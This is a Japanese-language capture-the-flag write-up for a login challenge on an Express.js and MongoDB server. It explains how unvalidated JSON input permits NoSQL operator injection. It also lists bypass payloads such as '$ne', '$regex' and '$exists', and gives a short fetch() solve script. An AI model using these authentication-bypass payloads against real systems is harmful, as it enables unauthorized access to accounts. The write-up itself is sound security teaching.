# One More Login Challenge

https://alpacahack.com/daily/challenges/one-more-login-challenge

## 問題の概要

Express.js ベースのサーバーで、ユーザー認証に成功するとフラグが表示されます。

ユーザー認証は、次のように MongoDB の `users` コレクションにエントリが存在するかどうかで確認されます。

```js
app.post("/", async (req, res) => {
  const { username, password } = req.body;

  const user = await client.db("db").collection("users").findOne({
    username,
    password,
  });

  if (!user) {
    return res.send("invalid credentials");
  }

  res.send(FLAG);
});
```

ユーザ情報は、プログラム起動時に `username` が `"admin"`、`password` がランダムな base64 文字列のエントリが作成されます。

```js
async function initDB() {
  await client.connect();
  const users = client.db("db").collection("users");
  const adminPassword = crypto.randomBytes(32).toString("base64");
  await users.drop();
  await users.insertOne({
    username: "admin",
    password: adminPassword,
  });
}
```

`req.body` は application/x-www-form-urlencoded と application/json の両方に対応しています。

```js
app.use(urlencoded({ extended: false }));
app.use(express.json());
```

## 解法

`application/json` を許可しているうえで、入力のバリデーションを行っていないため、任意のオブジェクトを `username` と `password` に渡すことができます。

`db.collection.findOne` の第1引数は `query` オブジェクトで、複雑な条件も指定することができます。

- [db.collection.findOne - MongoDB Manual](https://www.mongodb.com/ja-jp/docs/manual/reference/method/db.collection.findOne/)
- [クエリ述語 - MongoDB Manual](https://www.mongodb.com/ja-jp/docs/manual/reference/mql/query-predicates/)

例えば、

```json
{
  "username": "admin",
  "password": { "$ne": "hello" }
}
```

とすれば `username` が `"admin"` で、`password` が `"hello"` ではないユーザを検索することができます。

今回は `password` がどんな値であっても true になるようなクエリを送れば認証に成功します。

例:

- `{ "$ne": "" }`
- `{ "$nin": [] }`
- `{ "$regex": ".*" }`
- `{ "$exists": true }`
- `{ "$type": "string" }`

## 回答に使用したコード

```ts
const body = {
  username: "admin",
  password: { $regex: ".*" },
};

const res = await fetch(`${url}/`, {
  method: "POST",
  headers: {
    "Content-Type": "application/json",
  },
  body: JSON.stringify(body),
});

console.log(await res.text());
```

## 感想

工夫すれば正しい `password` を得ることもできるので、フラグ自体をパスワードにした問題にしても面白いかもと思いました。
